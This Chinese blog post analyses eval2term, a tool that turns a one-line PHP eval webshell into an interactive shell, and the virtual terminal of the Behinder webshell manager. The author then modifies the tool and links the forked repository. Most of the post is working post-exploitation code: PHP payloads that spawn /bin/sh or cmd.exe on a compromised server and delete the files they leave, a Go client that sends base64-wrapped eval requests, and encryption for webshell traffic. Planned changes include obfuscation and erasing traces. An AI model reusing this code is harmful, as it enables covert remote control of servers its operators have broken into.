---
title: "基于eval2term的小改"
slug: "eval2term-2"
description: "远远远算不上二开，就是个小改（进行中），轻喷=v="
date: 2022-09-12T23:55:59+08:00
categories: ["NOTES&SUMMARY"]
series: ["t00ls"]
tags: ["Go", "webshell"]
draft: false
toc: true
---

原项目地址->[She11Way](https://github.com/She11Way)/[eval2term](https://github.com/She11Way/eval2term)  |  个人小改后的项目地址->[AmiaaaZ](https://github.com/AmiaaaZ)/[eval2term](https://github.com/AmiaaaZ/eval2term)

早上刷微博看到有师傅转发这个项目，被演示视频惊到了：只需要php一句话就能做到交互式的shell！于是赶紧学一波

## 源码分析

*原作者已经在README.md中写明了实现原理，这里是源码上的分析，可以直接跳过这一part

要做到interactive shell主要需要处理的是读取待执行的命令并传递到服务端和正确返回回显这两部分，eval2term是通过在服务端写入文件并操作`/bin/sh`的管道来实现的，而完成读写文件、操作管道的部分都是靠一句话小马里传入php代码来完成

这样的php代码分为4种，当首次连接时先发送的是stop（程序报错异常也会发送stop），将连接时在目标服务端产生的文件或历史文件删除

```php
$STDIN = ".sw_in";
$STDOUT = ".sw_out";
@unlink($STDIN);
@unlink($STDOUT);
```

之后使用go statement在内部新开一个线程，只执行start，不间断处理请求：把.sw_in中待执行的命令全部写到管道的标准输入中

```php
$STDIN = ".sw_in";
$STDOUT = ".sw_out";

ignore_user_abort(true);
set_time_limit(0);
ob_start(); // 测试缓冲区读写
echo "ok";
ob_end_flush();
flush();

$desc = array(
    0 => array("pipe", "r"),    // 标准输入
    1 => array("file", $STDOUT, "a"),   // 标准输出
    2 => array("file", $STDOUT, "a")    // 标准错误
);

$handle = proc_open("/bin/sh", $desc, $pipes);  // 创建`/bin/sh`的管道
@file_put_contents($STDIN, "bash -i\n");

while (1) { // 不间断执行 把.sw_in中待执行的命令全部写到管道的标准输入中
    sleep(0.1);
    if (!proc_get_status($handle)["running"]) break;    // 管道破裂
    if (!file_exists($STDIN)) break;    // .sw_in文件不存在
    $c = @file_get_contents($STDIN);
    @file_put_contents($STDIN, "");
    if (strlen($c) == 0) {
        sleep(0.2);
        continue;
    }
    fwrite($pipes[0], $c);
}
fclose($pipes[0]);  // 关闭管道输入
proc_close($handle);    // 关闭管道
@unlink($STDIN);    // 删除痕迹
@unlink($STDOUT);
```

write则是把待执行的命令写入.sw_in中

```php
$STDIN = ".sw_in";
$fp = fopen($STDIN, "a");
fwrite($fp, $_GET["c"]);
fclose($fp);
```

read负责输出回显

```php
$STDOUT = ".sw_out";
if (!file_exists($STDOUT)) {
@header("HTTP/1.1 500");
die();
}
$r = @file_get_contents($STDOUT);
@file_put_contents($STDOUT, "");
echo($r);
```

全部这4种指令都是靠一句话小马的http请求完成

```php
func PostData(code string) string {
    return fmt.Sprintf("eval(base64_decode(\"%s\"));", base64.StdEncoding.EncodeToString([]byte(code)))
}
```

初次建立连接后，后续的命令都靠读入终端的输入（发送write），ctrl+D退出（发送stop）

```go
// 监听用户输入，发送
if err := keyboard.Open(); err != nil {
    panic(err)
}

defer keyboard.Close()

var cmdCache string

go func() {
    for {
        // 如果没有输入数据，则延时1秒后再检测
        if len(cmdCache) == 0 {
            time.Sleep(time.Second)
            continue
        }
        httpPost(fmt.Sprintf("%s?c=%s", Url, cmdCache), PostData(PhpCode.write))
        cmdCache = ""
        // 2秒发送一次
        time.Sleep(time.Second * 2)
    }
}()

for {
    char, key, err := keyboard.GetKey()
    if err != nil {
        panic(err)
    }
    // 输入ctrl+D 退出程序
    if key == 0x04 {
        break
    }
    var c string
    if char == 0x00 && key != 0x00 {
        c = fmt.Sprintf("%02x", key)
    } else if char != 0x00 {
        c = fmt.Sprintf("%02x", char)
    }

    t, _ := hex.DecodeString(c)
    cmdCache += url.QueryEscape(string(t))
}
```

## 存在的问题

- 延迟高，这个延迟是真的很高，每次处理读入和回显都是一次http请求
- 流量大，传输内容不加密
- 需要已知可读可写目录的绝对路径，默认为当前路径且不可接收对应的参数
- 默认生成的文件名固定
- 仅支持Linux

不过即使存在这些缺点，掩盖不了它的优点：（几乎）完美解决了不出网或不能搭代理的内网Linux主机的操作问题！

## 同类工具之冰蝎虚拟终端

众所周知冰蝎中有虚拟终端这个利器，能够实现1：1仿真的交互式shell ~~（其实第一眼看eval2term就有既视感 像是从冰蝎里抠出来的）~~ ；为了方便操作这里debug的冰蝎版本是3.0，4.0相较于3.0的更新主要在于可以自定义传输协议，在虚拟终端功能上没有太大改进，源码来自

### 框架

虚拟终端在代码中的入口从net/rebeyond/behinder/ui/RealCmdViewTab.fxml（图形化界面的配置文件）中找

```xml
<AnchorPane prefHeight="600.0" prefWidth="800.0" xmlns="http://javafx.com/javafx/10.0.2-internal" xmlns:fx="http://javafx.com/fxml/1" fx:controller="net.rebeyond.behinder.ui.controller.RealCmdViewController">
```

定位到net.rebeyond.behinder.ui.controller.RealCmdViewController，先静态审计代码&粗略打断点，主要涉及到这几个类

```
net/rebeyond/behinder/ui/controller/RealCmdViewController.java
net/rebeyond/behinder/core/ShellService.java
net/rebeyond/behinder/utils/Utils.java
net/rebeyond/behinder/core/Params.java
```

接着来正式debug，RealCmdViewController里起手就是一波多线程

![image-20220909000010014](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220909000010014.png)

核心代码不在createCmd而在initWorkers，这里先来个简略图

![image-20220909000348353](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220909000348353.png)

命令的写入和回显的输出分别靠cmdWriter和cmdReader，先看cmdWriter

![image-20220909002038612](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220909002038612.png)

本次待执行的命令后会被传入writeRealCMD进行发包&与服务端通信

![image-20220909002146099](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220909002146099.png)

如何让我们想执行的命令被服务端真正执行呢？和eval2term是一样的思路，把他写成php代码的形式塞到eval里执行就好了，这里的getData就是这样的功能

![image-20220909002341889](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220909002341889.png)

冰蝎提供了模板化的解题方式，即getParamedPhp：根据传入的className和params确定待执行的代码内容并打包，这里的代码是包含了需要输出

![image-20220909002540719](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220909002540719.png)

回到writeRealCMD中，接下来调用requestAndParse来发包（这块没什么好说的），之后this.immediatelyRead设为true，调用readRealCMD来处理回显~~（此处的图不是whoami的执行结果图，凑合看~~

![image-20220908234504424](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220908234504424.png)

这里的msg如果小于0则表示没收到回显，则会继续发包，直到有内容了

![image-20220908234357641](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220908234357641.png)

之后调用write输出到虚拟终端中

![image-20220908234532283](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220908234532283.png)

至此一次命令调用就基本结束了，创建/停止虚拟终端则是`getParamedPhp(className=ReadCMD, params=xxx)`的另外俩params：create和stop，当params=create时会在执行的PHP代码中附带bashPath参数表示可执行文件的路径（windows下为cmd.exe）

### 实际执行的PHP

上面的分析都是框架层面的，真正的内核还得是实际执行的命令；以执行whoami命令为例，create, write, read, stop分别都有不同的php代码，他们有一个共同的main函数

```php
function main($type, $bashPath = "", $cmd = "",$whatever = ""){
    $result = array();
    if ($type == "create") {	// 创建终端
        create($bashPath);
        $result["status"] = "success";	// 默认创建成功
    } else if ($type == "read") {	// 当接收回显时
    	if (isset($_SESSION["readBuffer"])){
    		@session_start();
        	$readContent = $_SESSION["readBuffer"];	// 从$_SESSION["readBuffer"]中读取回显结果
        	$_SESSION["readBuffer"] = substr($_SESSION["readBuffer"], strlen($readContent));
        	session_write_close();
        	$result["status"] = "success";
        	$result["msg"] = $readContent;
    	}
    	else{
    		$result["status"] = "fail";
        	$result["msg"] = "Virtual Terminal fail to start or timeout";
    	}
    } else if ($type == "write") {	// 当写入命令时
        $cmd = base64_decode($cmd);
        @session_start();
        $_SESSION["writeBuffer"] = $cmd;	// 待执行命令写入本次请求的$_SESSION["writeBuffer"]变量中
        session_write_close();
        $result["status"] = "success";	// 默认写入成功
    }
    else if ($type == "stop") {	// 停止终端
        @session_start();
        $_SESSION["run"] = false;
        session_write_close();
        $result["msg"] = "stopped";
        $result["status"] = "success";	// 默认停止成功
    }

    $result["status"] = base64_encode($result["status"]);	// 返回执行状态和内容
    $result["msg"] = base64_encode($result["msg"]);
    echo encrypt(json_encode($result),$_SESSION['k']);
}

function getSafeStr($str){
    // 最终均以utf-8输出
    $s1 = iconv('utf-8','gbk//IGNORE',$str);
    $s0 = iconv('gbk','utf-8//IGNORE',$s1);
    if($s0 == $str){
        return $s0;
    }else{
        return iconv('gbk','utf-8//IGNORE',$str);
    }
}

function encrypt($data,$key){
	if(!extension_loaded('openssl')){
    	for($i=0;$i<strlen($data);$i++) {
    		$data[$i] = $data[$i]^$key[$i+1&15];
    	}
		return $data;
    }else{
    	return openssl_encrypt($data, "AES128", $key);
    }
}
```

用if分别对应了4种请求，create创建管道：

```php
function create($bashPath){
    set_time_limit(0);
    @session_start();
    $_SESSION["readBuffer"] = "";
    session_write_close();
    $win = (FALSE !== strpos(strtolower(PHP_OS), 'win'));
    if ($win) { // 获取系统临时文件夹绝对路径（有可读写权限）
        $outputfile = sys_get_temp_dir() . DIRECTORY_SEPARATOR . rand() . ".txt";
        $errorfile = sys_get_temp_dir() . DIRECTORY_SEPARATOR . rand() . ".txt";
    }

    // 设置进程读写管道
    $descriptorspec = array(
        0 => array(
            "pipe",
            "r"
        ),
        1 => array(
            "pipe",
            "w"
        ),
        2 => array(
            "pipe",
            "w"
        )
    );
    if ($win) {
        $descriptorspec[1] = array(
            "file",
            $outputfile,
            "a"
        );
        $descriptorspec[2] = array(
            "file",
            $errorfile,
            "a"
        );
        $process = proc_open($bashPath, $descriptorspec, $pipes);
    }else{
        $env = array('TERM' => 'xterm');    // 环境变量
        $process = proc_open($bashPath, $descriptorspec, $pipes,NULL,$env);
    }

    if (! is_resource($process)) {  // 未创建成功 退出
        exit(1);
    }

    stream_set_blocking($pipes[0], 0);	// 设置非阻塞模式

    // 把输出内容读到变量中
    if ($win) {
        $reader = fopen($outputfile, "r+");
        $error = fopen($errorfile, "r+");
    } else {
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        $reader = $pipes[1];
        $error = $pipes[2];
    }

    @session_start();
    $_SESSION["run"] = true;
    session_write_close();
    if (! $win) {   // ?万一linux下没有python或无权限调用呢
        fwrite($pipes[0], sprintf("python -c 'import pty; pty.spawn(\"%s\")'\n", $bashPath));
        fflush($pipes[0]);
    }

    sleep(1);
    $idle=0;
    while ($_SESSION["run"] and $idle<1000000) {
        @session_start();
        @$writeBuffer = $_SESSION["writeBuffer"];   // 读出待执行的命令
        session_write_close();
        if (strlen($writeBuffer) > 0) {
            fwrite($pipes[0], $writeBuffer);    // 将待执行命令写入管道输入中
            fflush($pipes[0]);

            session_start();
            $_SESSION["writeBuffer"] = "";  // 清空writeBuffer
            session_write_close();
            $idle=0;
        }
        else{
            $idle=$idle+1;
        }
        while (($output = fread($reader, 10240)) != false) {
            // 对输出内容做转义 输出utf-8
            if (!function_exists("mb_convert_encoding")){
                   $output=getSafeStr($output);
            }else{
            	$output=mb_convert_encoding($output, 'UTF-8', mb_detect_encoding($output, "UTF-8,GBK"));
            }
            @session_start();
            $_SESSION["readBuffer"] = $_SESSION["readBuffer"] . $output;    // 此处readBuffer为空 直接写入output
            session_write_close();
        }
        if ($win){
            ftruncate($reader, 0);  // 清空outputfile
        }
        while (($errput = fread($error, 10240)) != false) {
            // 对标准错误同上处理
            if (!function_exists("mb_convert_encoding")){
                $errput=getSafeStr($errput);
            }else{
                $errput=mb_convert_encoding($errput, 'UTF-8', mb_detect_encoding($errput, "UTF-8,GBK"));
            }
            @session_start();
            $_SESSION["writeBuffer"]="";
            $_SESSION["readBuffer"] = $_SESSION["readBuffer"] . $errput;
            session_write_close();
        }
        if ($win){
            ftruncate($error, 0);   // 清空errorfile
        }
        sleep(0.8);
    }
    fclose($reader);    // 关闭两个句柄
    fclose($error);
    unset($_SESSION["readBuffer"]); // 清除痕迹
    if ($win){
        unlink($outputfile);
        unlink($errorfile);
    }
}
```

write写入执行命令（以whoami为例）

```php
$type="d3JpdGU=";
$type=base64_decode($type);
$bashPath="";
$bashPath=base64_decode($bashPath);
$cmd="ZDJodllXMXBEUW89";
$cmd=base64_decode($cmd);
$whatever="";

main($type,$bashPath,$cmd,$whatever);
```

read读回显

```php
$type="cmVhZA==";
$type=base64_decode($type);
$bashPath="";
$bashPath=base64_decode($bashPath);
$cmd="";
$cmd=base64_decode($cmd);
$whatever="xxxxxxxxxxxxxx";
$whatever=base64_decode($whatever);

main($type,$bashPath,$cmd,$whatever);
```

stop停止终端

```php
$type="c3RvcA==";
$type=base64_decode($type);
$bashPath="";
$bashPath=base64_decode($bashPath);
$cmd="";
$cmd=base64_decode($cmd);
$whatever="xxxxxxxxxxxxxx";
$whatever=base64_decode($whatever);

main($type,$bashPath,$cmd,$whatever);
```

上面的代码就不用我细嗦了，都很好懂；不过实际上这并不是最终发送给shell.php的最终内容，代码仍然经过了多次包装；以读回显为例，入口在readRealCMD

![image-20220909112357030](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220909112357030.png)

params指定了要使用的模板，其中的whatever变量是随机产生的垃圾值不需要管，之后调用Utils.getData对代码进行组装

![image-20220909112641792](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220909112641792.png)

内部继续调用Params.getParamedPhp来确定代码内容（我们上面贴出来的就是对应模板下的返回值），经过b64编码和getBytes处理后再塞入`assert|eval(base64_decode('xxxx'));`中，之后再经过加密、b64编码、getBytes处理，这才是最终的传给shell.php的部分

### 取经

可以看出eval2term是一个迷你精简版的冰蝎虚拟终端 ~~（希望我这么说原作者不会打我 小孩子不懂事说着玩的）~~，核心逻辑上两者真的是一模一样的：在服务端创建进程管道，接收命令为标准输入，标准输出写入系统临时文件夹下的文件中，再不停地读出回显，稍有去别的点在于冰蝎充分利用了php session机制，使得待执行的命令和回显是分别通过session中的writeBuffer和readBuffer进行传递，并且每次执行完毕后都会清空对应变量和在服务端产生的文件

当然，我们的eval2term胜在go编译 天生的跨平台，并且轻便（相较于冰蝎），解决了内网中可能出现的多层代理问题，我总结了这几个可以借鉴冰蝎的思路：

- 添加对Windows的支持

- 利用上SESSION变量，也将待执行命令和回显临时存放进去
- 对PHP代码做混淆或加密处理（这一点也有待商榷，毕竟加解密会影响速度）
- 每次执行完命令后及时清楚痕迹
- 添加对方向键及特殊键的支持
- 优化代码结构

## 改造

基于以上的借鉴思路我们开始着手改造eval2term！

### 对windows的支持

把`/bin/sh`换为`cmd.exe`后还需要注意这里

```php
$handle = proc_open("cmd.exe", $desc, $pipes);
@file_put_contents($STDIN, "");
```

第二行不能省略，不然也创建不了进程

### 对中文的支持

这里我借鉴了冰蝎的思路

```php
if (($output = fread(fopen($STDOUT, "r+"), 10240)) != false){
    if (!function_exists("mb_convert_encoding")){
        $s1 = iconv('utf-8', 'gbk//IGNORE', $output);
        $s0 = iconv('gbk', 'utf-8//IGNORE', $s1);
        if ($s0 == $output){
            $output = $s0;
        }else{
            $output = iconv('gbk', 'utf-8//IGNORE', $output);
        }
    }else{
        $output = mb_convert_encoding($output, 'UTF-8', mb_detect_encoding($output, "UTF-8,GBK"));
    }
	echo($output);
	@file_put_contents($STDOUT, "");
}
```

### 改进读键盘输入

原项目中对键盘输入的读写多少有点奇怪。。。

```go
go func() {
	for {
		// 如果没有输入数据，则延时1秒后再检测
		if len(cmdCache) == 0 {
			time.Sleep(time.Second)
			continue
		}
		httpPost(fmt.Sprintf("%s?c=%s", Url, cmdCache), PostData(PhpCode.write))
		cmdCache = ""
		// 2秒发送一次
		time.Sleep(time.Second * 2)
	}
}()

for {
	char, key, err := keyboard.GetKey()
	if err != nil {
		panic(err)
	}
	// 输入ctrl+D 退出程序
	if key == 0x04 {
		break
	}

	var c string
	if char == 0x00 && key != 0x00 {
		c = fmt.Sprintf("%02x", key)
	} else if char != 0x00 {
		c = fmt.Sprintf("%02x", char)
	}

	t, _ := hex.DecodeString(c)
	cmdCache += url.QueryEscape(string(t))
}
```

就非常诡异，这样的检测会带来这样的效果

![image-20220912234724039](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220912234724039.png)

那为啥不检测到Enter之后再发送呢？我改成了如下的代码

```go
for {
	char, key, err := keyboard.GetKey()
	if err != nil {
		panic(err)
	}
	if key != keyboard.KeyCtrlD {
		if key != keyboard.KeyEnter {
			if key == keyboard.KeySpace {
				cmdCache += " "
			} else if key == keyboard.KeyBackspace {
				cmdCache = cmdCache[:len(cmdCache)-1]
			} else {
				cmdCache += string(char)
			}
		} else {
			httpPost(fmt.Sprintf("%s?c=%s", Url, url.QueryEscape(cmdCache)), PostDat(PhpCode.write))
			cmdCache = ""
		}
	} else {
		fmt.Println("\n\n[!] Stop server..")
		httpPost(Url, PostData(PhpCode.stop))
	}
}
```

### 未解决的问题

- 自动判断目标系统类型
-  流量加密
-  解决一小段时间后就会断链的问题

第三个问题最蛋疼，亲测在linux上不存在这样的问题，windows上就会这样，猜测原因有可能是：webserver超时设置或者前面我改的监听键盘输入逻辑不合理，目前还没有进一步测试（懒狗见谅，不过也就这一两天的事，会尽快做好的